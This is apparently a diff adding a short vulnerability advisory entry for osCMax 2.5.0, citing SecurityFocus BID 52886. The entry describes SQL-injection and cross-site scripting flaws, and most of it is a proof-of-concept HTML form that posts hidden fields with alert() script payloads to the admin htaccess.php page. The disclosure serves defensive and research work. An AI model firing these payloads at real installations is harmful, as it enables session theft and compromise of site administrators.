@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/52886/info
+ 
+osCMax is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+ 
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+ 
+osCMax 2.5.0 is vulnerable; prior versions may also be affected. 
+
+<form action="http://www.example.com/admin/htaccess.php" method="post" name="main" id="main">
+<input type="hidden" name="sb_id" value='"><script>alert(1);</script>'>
+<input type="hidden" name="sb_key" value='"><script>alert(2);</script>'>
+<input type="hidden" name="gc_id" value='"><script>alert(3);</script>'>
+<input type="hidden" name="gc_key" value='"><script>alert(4);</script>'>
+<input type="hidden" name="path" value='"><script>alert(5);</script>'>
+<input type="submit" name="submit" value="Send">
+</form>
